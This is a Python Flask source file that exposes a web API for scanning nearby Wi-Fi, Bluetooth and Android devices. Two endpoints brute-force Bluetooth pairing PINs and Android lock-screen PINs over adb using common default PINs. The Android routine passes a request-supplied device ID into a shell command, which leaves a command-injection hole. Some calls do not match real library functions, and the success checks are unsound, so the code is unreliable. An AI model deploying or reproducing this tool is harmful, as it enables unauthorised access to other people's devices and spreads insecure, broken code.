from flask import Flask, request, jsonify
import subprocess
import re
import os
import json
import time
from scapy.all import *
import socket
import netifaces as ni
import bluetooth
import adb

app = Flask(__name__)

def run_command(command, shell=False):
    try:
        result = subprocess.run(command, shell=shell, capture_output=True, text=True, check=True)
        return result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        return None, str(e)

def discover_networks():
    try:
        stdout, stderr = run_command(["iwlist", "wlan0", "scan"])
        if stderr:
            print(f"Error: {stderr}")
            return None

        networks = []
        current_network = {}

        for line in stdout.splitlines():
            if "Cell" in line:
                if current_network:
                    networks.append(current_network)
                current_network = {"Cell": line.split(': ')[1]}
            elif "Address:" in line:
                current_network["BSSID"] = line.split(': ')[1]
            elif "Channel:" in line:
                current_network["Channel"] = line.split(': ')[1]
            elif "ESSID:" in line:
                current_network["ESSID"] = line.split(': ')[1].strip('"')
            elif "Mode:" in line:
                current_network["Mode"] = line.split(': ')[1]
            elif "Frequency:" in line:
                current_network["Frequency"] = line.split(': ')[1]
            elif "Quality=" in line:
                current_network["Quality"] = line.split('=')[1].split(' ')[0]
            elif "Encryption key:" in line:
                current_network["Encryption"] = line.split(': ')[1]
            elif "IE:" in line:
                current_network["IE"] = line.split(': ')[1]

        if current_network:
            networks.append(current_network)

        return networks

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"Error getting local IP: {e}")
        return None

def get_device_info():
    try:
        interfaces = ni.interfaces()
        device_info = {}

        for interface in interfaces:
            iface_info = ni.ifaddresses(interface)
            current_device = {"Interface": interface}

            if ni.AF_INET in iface_info:
                current_device["IPv4"] = iface_info[ni.AF_INET][0]['addr']
                current_device["Netmask"] = iface_info[ni.AF_INET][0]['netmask']
                current_device["Broadcast"] = iface_info[ni.AF_INET][0]['broadcast']

            if ni.AF_LINK in iface_info:
                current_device["Mac"] = iface_info[ni.AF_LINK][0]['addr']

            device_info[interface] = current_device

        return device_info

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def get_router_info():
    try:
        gateways = ni.gateways()
        router_info = {}

        for family, gateways_list in gateways.items():
            if family == ni.AF_INET:
                for gateway in gateways_list:
                    router_info["Router_IP"] = gateway[0]
                    router_info["Interface"] = gateway[1]

        return router_info

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def detect_bluetooth_devices():
    try:
        nearby_devices = bluetooth.discover_devices(lookup_names=True)
        bluetooth_devices = []

        for addr, name in nearby_devices:
            device_info = {
                "Address": addr,
                "Name": name,
                "Type": "Bluetooth"
            }
            bluetooth_devices.append(device_info)

        return bluetooth_devices

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def detect_android_devices():
    try:
        devices = adb.list_devices()
        android_devices = []

        for device in devices:
            device_id, status = device
            device_info = {
                "Device_ID": device_id,
                "Status": status,
                "Type": "Android"
            }
            android_devices.append(device_info)

        return android_devices

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def brute_force_bluetooth(device_address, pin_list):
    try:
        for pin in pin_list:
            result = bluetooth.passkey_variant(device_address, pin)
            if result:
                return f"Brute-force successful with PIN: {pin}"
        return "Brute-force failed"

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

def brute_force_android(device_id, pin_list):
    try:
        for pin in pin_list:
            command = f"adb -s {device_id} shell input text {pin} && adb -s {device_id} shell input keyevent 66"
            stdout, stderr = run_command(command, shell=True)
            if "error" not in stderr.lower():
                return f"Brute-force successful with PIN: {pin}"
        return "Brute-force failed"

    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

@app.route('/networks/discover', methods=['GET'])
def discover_networks_endpoint():
    networks = discover_networks()
    if networks:
        return jsonify(networks), 200
    else:
        return jsonify({"error": "Failed to discover networks"}), 500

@app.route('/ip/local', methods=['GET'])
def local_ip_endpoint():
    ip = get_local_ip()
    if ip:
        return jsonify({"local_ip": ip}), 200
    else:
        return jsonify({"error": "Failed to retrieve local IP"}), 500

@app.route('/devices/info', methods=['GET'])
def device_info_endpoint():
    devices = get_device_info()
    if devices:
        return jsonify(devices), 200
    else:
        return jsonify({"error": "Failed to retrieve device information"}), 500

@app.route('/router/info', methods=['GET'])
def router_info_endpoint():
    router_info = get_router_info()
    if router_info:
        return jsonify(router_info), 200
    else:
        return jsonify({"error": "Failed to retrieve router information"}), 500

@app.route('/bluetooth/devices', methods=['GET'])
def bluetooth_devices_endpoint():
    devices = detect_bluetooth_devices()
    if devices:
        return jsonify(devices), 200
    else:
        return jsonify({"error": "Failed to detect Bluetooth devices"}), 500

@app.route('/android/devices', methods=['GET'])
def android_devices_endpoint():
    devices = detect_android_devices()
    if devices:
        return jsonify(devices), 200
    else:
        return jsonify({"error": "Failed to detect Android devices"}), 500

@app.route('/brute_force/bluetooth', methods=['POST'])
def brute_force_bluetooth_endpoint():
    data = request.json
    device_address = data.get('device_address')
    pin_list = data.get('pin_list', ["0000", "1234", "1111", "0001", "9999"])
    if not device_address:
        return jsonify({"error": "Missing device_address"}), 400

    result = brute_force_bluetooth(device_address, pin_list)
    if result:
        return jsonify({"message": result}), 200
    else:
        return jsonify({"error": "Brute-force attack failed"}), 500

@app.route('/brute_force/android', methods=['POST'])
def brute_force_android_endpoint():
    data = request.json
    device_id = data.get('device_id')
    pin_list = data.get('pin_list', ["0000", "1234", "1111", "0001", "9999"])
    if not device_id:
        return jsonify({"error": "Missing device_id"}), 400

    result = brute_force_android(device_id, pin_list)
    if result:
        return jsonify({"message": result}), 200
    else:
        return jsonify({"error": "Brute-force attack failed"}), 500

if __name__ == '__main__':
    app.run(debug=True)